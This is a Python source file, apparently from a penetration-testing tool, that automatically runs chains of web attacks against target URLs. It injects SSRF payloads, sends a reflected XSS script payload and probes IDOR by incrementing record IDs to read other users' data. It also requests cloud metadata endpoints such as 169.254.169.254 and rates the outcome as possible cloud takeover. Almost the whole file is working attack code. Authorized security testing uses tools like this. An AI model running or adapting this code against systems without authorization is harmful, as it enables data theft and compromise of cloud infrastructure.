#!/usr/bin/env python3
"""Chain Exploiter

Automatically executes detected attack chains.
Uses output of step N as input for step N+1.
"""

import os
import time
import requests
from typing import Dict, Any, List, Optional


def execute_chain(chain: List[Dict[str, Any]], auth_context: Optional[Dict] = None) -> Dict[str, Any]:
    """Execute an attack chain step by step
    
    Args:
        chain: List of findings in the chain (from find_chains)
        auth_context: Optional authentication context
        
    Returns:
        Dict with execution results
    """
    results = {
        "success": False,
        "steps_executed": 0,
        "final_impact": None,
        "evidence": [],
        "errors": []
    }
    
    # Build request context
    headers = {}
    cookies = {}
    if auth_context:
        headers.update(auth_context.get("headers", {}))
        cookies.update(auth_context.get("cookies", {}))
    
    # Track state between steps
    chain_state = {}
    
    # Execute each step in sequence
    for i, step in enumerate(chain):
        step_name = step.get("name") or step.get("vulnerability_type", f"step_{i}")
        step_url = step.get("url") or step.get("uri") or step.get("target", "")
        
        if not step_url:
            results["errors"].append(f"Step {i}: No URL found")
            continue
        
        try:
            # Execute step based on vulnerability type
            vuln_type = step.get("vulnerability_type", "").lower()
            
            if "ssrf" in vuln_type:
                step_result = _execute_ssrf_step(step, chain_state, headers, cookies)
            elif "xss" in vuln_type:
                step_result = _execute_xss_step(step, chain_state, headers, cookies)
            elif "idor" in vuln_type:
                step_result = _execute_idor_step(step, chain_state, headers, cookies)
            elif "metadata" in vuln_type or "cloud" in vuln_type:
                step_result = _execute_metadata_step(step, chain_state, headers, cookies)
            else:
                # Generic step execution
                step_result = _execute_generic_step(step, chain_state, headers, cookies)
            
            if step_result.get("success"):
                results["steps_executed"] += 1
                results["evidence"].append({
                    "step": i,
                    "step_name": step_name,
                    "result": step_result
                })
                
                # Update chain state with step output
                chain_state.update(step_result.get("output", {}))
            else:
                results["errors"].append(f"Step {i} ({step_name}): {step_result.get('error', 'Unknown error')}")
                # Continue anyway - some steps might fail but chain might still work
                
        except Exception as e:
            results["errors"].append(f"Step {i} ({step_name}): Exception - {str(e)}")
            continue
    
    # Determine final impact
    if results["steps_executed"] == len(chain):
        results["success"] = True
        results["final_impact"] = _calculate_impact(chain, chain_state)
    elif results["steps_executed"] > 0:
        results["success"] = "partial"
        results["final_impact"] = _calculate_impact(chain[:results["steps_executed"]], chain_state)
    
    return results


def _execute_ssrf_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute SSRF step"""
    result = {"success": False, "output": {}}
    
    url = step.get("url") or step.get("uri", "")
    payload = step.get("payload") or step.get("evidence", {}).get("payload")
    
    if not url or not payload:
        result["error"] = "Missing URL or payload"
        return result
    
    try:
        # Inject SSRF payload
        # This is simplified - real implementation would parse and inject properly
        resp = requests.get(url, params={"url": payload}, headers=headers, cookies=cookies, timeout=10)
        
        if resp.status_code in (200, 201, 302):
            result["success"] = True
            result["output"] = {
                "ssrf_response": resp.text[:500],
                "status_code": resp.status_code
            }
            
            # Extract metadata if this is SSRF â†’ metadata chain
            if "metadata" in resp.text.lower() or "169.254.169.254" in resp.text:
                result["output"]["metadata_detected"] = True
    except Exception as e:
        result["error"] = str(e)
    
    return result


def _execute_xss_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute XSS step"""
    result = {"success": False, "output": {}}
    
    url = step.get("url") or step.get("uri", "")
    payload = step.get("payload") or "<script>alert(1)</script>"
    
    if not url:
        result["error"] = "Missing URL"
        return result
    
    try:
        # Test XSS payload
        resp = requests.get(url, params={"q": payload}, headers=headers, cookies=cookies, timeout=10)
        
        if payload in resp.text:
            result["success"] = True
            result["output"] = {
                "xss_reflected": True,
                "payload": payload
            }
    except Exception as e:
        result["error"] = str(e)
    
    return result


def _execute_idor_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute IDOR step"""
    result = {"success": False, "output": {}}
    
    url = step.get("url") or step.get("uri", "")
    
    if not url:
        result["error"] = "Missing URL"
        return result
    
    try:
        # Try to access resource with different ID
        # Extract ID from URL and modify it
        import re
        id_match = re.search(r'/(\d+)/', url)
        if id_match:
            original_id = id_match.group(1)
            # Try with different ID
            test_id = str(int(original_id) + 1)
            test_url = url.replace(f"/{original_id}/", f"/{test_id}/")
            
            resp = requests.get(test_url, headers=headers, cookies=cookies, timeout=10)
            
            if resp.status_code == 200:
                result["success"] = True
                result["output"] = {
                    "idor_confirmed": True,
                    "test_url": test_url,
                    "data": resp.text[:500]
                }
    except Exception as e:
        result["error"] = str(e)
    
    return result


def _execute_metadata_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute cloud metadata step"""
    result = {"success": False, "output": {}}
    
    # If previous step was SSRF, use that to access metadata
    if state.get("ssrf_response"):
        # Metadata access was already confirmed in SSRF step
        result["success"] = True
        result["output"] = {
            "metadata_accessed": True,
            "source": "ssrf_response"
        }
    else:
        # Try direct metadata access (unlikely to work, but try)
        metadata_urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
        ]
        
        for metadata_url in metadata_urls:
            try:
                resp = requests.get(metadata_url, headers={"Metadata-Flavor": "Google"}, timeout=5)
                if resp.status_code == 200:
                    result["success"] = True
                    result["output"] = {
                        "metadata_accessed": True,
                        "metadata_url": metadata_url,
                        "data": resp.text[:500]
                    }
                    break
            except Exception:
                continue
    
    return result


def _execute_generic_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute generic step"""
    result = {"success": False, "output": {}}
    
    url = step.get("url") or step.get("uri", "")
    if not url:
        result["error"] = "Missing URL"
        return result
    
    try:
        resp = requests.get(url, headers=headers, cookies=cookies, timeout=10)
        if resp.status_code == 200:
            result["success"] = True
            result["output"] = {"response": resp.text[:500]}
    except Exception as e:
        result["error"] = str(e)
    
    return result


def _calculate_impact(chain: List[Dict[str, Any]], state: Dict[str, Any]) -> Dict[str, Any]:
    """Calculate business impact of executed chain"""
    impact = {
        "severity": "low",
        "impact_types": [],
        "description": ""
    }
    
    # Check what was achieved
    if state.get("metadata_accessed"):
        impact["impact_types"].append("cloud_metadata_exposure")
        impact["severity"] = "high"
        impact["description"] = "Cloud metadata accessed - potential for cloud takeover"
    
    if state.get("idor_confirmed"):
        impact["impact_types"].append("sensitive_data_exposure")
        if impact["severity"] != "high":
            impact["severity"] = "medium"
        impact["description"] += " IDOR confirmed - sensitive data may be exposed"
    
    if state.get("xss_reflected"):
        impact["impact_types"].append("client_side_execution")
        if impact["severity"] != "high":
            impact["severity"] = "medium"
        impact["description"] += " XSS confirmed - client-side code execution possible"
    
    # Determine overall impact
    if "cloud_metadata_exposure" in impact["impact_types"]:
        impact["severity"] = "critical"
        impact["description"] = "Critical: Cloud infrastructure compromise possible"
    elif len(impact["impact_types"]) >= 2:
        impact["severity"] = "high"
    
    return impact

